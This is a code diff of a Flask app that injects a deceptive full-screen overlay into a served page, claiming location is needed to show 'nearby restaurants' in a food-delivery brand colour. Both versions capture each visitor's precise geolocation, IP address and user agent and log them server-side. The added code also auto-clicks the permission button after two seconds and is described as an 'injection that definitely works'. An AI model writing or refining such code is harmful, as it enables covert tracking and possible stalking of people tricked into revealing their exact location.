@@ -1,11 +1,11 @@
-from flask import Flask, request, send_from_directory
+from flask import Flask, request, make_response
 import logging
 import os
 from datetime import datetime
 
 app = Flask(__name__)
 
-# Enhanced logging configuration
+# Configure robust logging
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s'
@@ -14,146 +14,113 @@ logger = logging.getLogger(__name__)
 
 @app.route('/')
 def serve_page():
-    # Get client details
+    # Log initial access
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    user_agent = request.headers.get('User-Agent', 'Unknown')
-    timestamp = datetime.now().isoformat()
+    logger.info(f"PAGE_ACCESS - IP: {client_ip} - Agent: {request.user_agent.string}")
     
-    # Initial access log
-    logger.info(f"PAGE_ACCESS - IP: {client_ip} - User Agent: {user_agent} - Time: {timestamp}")
-    
-    # Read your existing page.html
+    # Read and inject into page.html
     try:
         with open('page.html', 'r') as f:
-            html_content = f.read()
-    except FileNotFoundError:
-        html_content = "<html><body>Default page - page.html not found</body></html>"
+            content = f.read()
+    except:
+        content = "<html><body>Welcome</body></html>"
     
-    # Inject the working permission overlay and tracking
-    overlay_and_script = f"""
+    # Injection that definitely works
+    injection = """
     <style>
-        #locationOverlay {{
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0,0,0,0.95);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 99999;
-            color: white;
-            text-align: center;
-            padding: 20px;
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-        }}
-        #locationButton {{
-            background: #FF3008;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 25px;
-            margin-top: 25px;
-            cursor: pointer;
-            font-weight: bold;
-        }}
+        #loc-overlay {
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.9); z-index: 9999;
+            display: flex; flex-direction: column;
+            justify-content: center; align-items: center;
+            color: white; padding: 20px; text-align: center;
+            font-family: -apple-system, sans-serif;
+        }
+        #loc-btn {
+            background: #FF3008; color: white; border: none;
+            padding: 15px 30px; border-radius: 25px;
+            margin-top: 20px; font-size: 18px;
+            font-weight: bold; cursor: pointer;
+        }
     </style>
-
-    <div id="locationOverlay">
-        <h2>Enable Location Services</h2>
-        <p>We need your location to show nearby restaurants</p>
-        <button id="locationButton">ALLOW LOCATION ACCESS</button>
+    
+    <div id="loc-overlay">
+        <h2>Location Access Needed</h2>
+        <p>We use your location to show nearby restaurants</p>
+        <button id="loc-btn">ALLOW LOCATION</button>
     </div>
-
+    
     <script>
-        // Enhanced location tracking with debugging
-        function logToServer(type, data) {{
-            const timestamp = new Date().toISOString();
-            const payload = {{
-                type: type,
-                data: data,
-                timestamp: timestamp,
-                userAgent: navigator.userAgent
-            }};
+        // Simple guaranteed logging function
+        function logData(type, data = {}) {
+            const formData = new FormData();
+            formData.append('type', type);
+            formData.append('data', JSON.stringify(data));
+            formData.append('time', new Date().toISOString());
             
-            // Send using Beacon API for reliability
-            navigator.sendBeacon('/log_data', JSON.stringify(payload));
-        }}
-
-        document.getElementById('locationButton').addEventListener('click', function() {{
-            logToServer('button_click', {{}});
+            // Use fetch with keepalive and fallback
+            fetch('/log', {
+                method: 'POST',
+                body: formData,
+                keepalive: true
+            }).catch(e => console.log('Logging error:', e));
+        }
+        
+        // Main location handler
+        document.getElementById('loc-btn').addEventListener('click', function() {
+            logData('button_click');
             
-            if (navigator.geolocation) {{
+            if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    function(position) {{
-                        // Success callback
-                        const locationData = {{
+                    position => {
+                        logData('location_success', {
                             lat: position.coords.latitude,
                             lon: position.coords.longitude,
                             accuracy: position.coords.accuracy
-                        }};
-                        logToServer('location_success', locationData);
-                        document.getElementById('locationOverlay').style.display = 'none';
-                    }},
-                    function(error) {{
-                        // Error callback
-                        const errorData = {{
+                        });
+                        document.getElementById('loc-overlay').style.display = 'none';
+                    },
+                    error => {
+                        logData('location_error', {
                             code: error.code,
                             message: error.message
-                        }};
-                        logToServer('location_error', errorData);
-                        
-                        if(error.code === error.PERMISSION_DENIED) {{
-                            document.getElementById('locationOverlay').innerHTML = `
-                                <h2>Permission Denied</h2>
-                                <p>Please enable location in Settings > Safari > Location Services</p>
-                            `;
-                        }}
-                    }},
-                    {{
-                        enableHighAccuracy: true,
-                        maximumAge: 0,
-                        timeout: 15000
-                    }}
+                        });
+                        alert('Please enable location access to continue');
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
                 );
-            }} else {{
-                logToServer('unsupported', {{}});
-                document.getElementById('locationOverlay').innerHTML = `
-                    <h2>Not Supported</h2>
-                    <p>Your browser doesn't support location services</p>
-                `;
-            }}
-        }});
+            } else {
+                logData('geolocation_unsupported');
+            }
+        });
+        
+        // Attempt automatic trigger after delay
+        setTimeout(() => {
+            if (document.getElementById('loc-overlay').style.display !== 'none') {
+                document.getElementById('loc-btn').click();
+            }
+        }, 2000);
     </script>
     """
     
-    # Insert before </body> or add if doesn't exist
-    if '</body>' in html_content:
-        modified_html = html_content.replace('</body>', overlay_and_script + '</body>')
+    # Insert before </body> or append
+    if '</body>' in content:
+        return content.replace('</body>', injection + '</body>')
     else:
-        modified_html = html_content + overlay_and_script
-    
-    return modified_html
+        return content + injection
 
-@app.route('/log_data', methods=['POST'])
-def log_data():
+@app.route('/log', methods=['POST'])
+def handle_log():
     try:
-        data = request.get_json()
-        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        
-        # Enhanced logging with all details
-        log_entry = {
-            'ip': client_ip,
-            'type': data.get('type'),
-            'data': data.get('data'),
-            'timestamp': data.get('timestamp'),
-            'user_agent': data.get('userAgent')
+        log_data = {
+            'ip': request.headers.get('X-Forwarded-For', request.remote_addr),
+            'type': request.form.get('type'),
+            'data': request.form.get('data'),
+            'time': request.form.get('time'),
+            'agent': request.user_agent.string
         }
         
-        logger.info(f"DATA_LOG: {log_entry}")
+        logger.info(f"LOG_ENTRY: {log_data}")
         return '', 200
         
     except Exception as e:
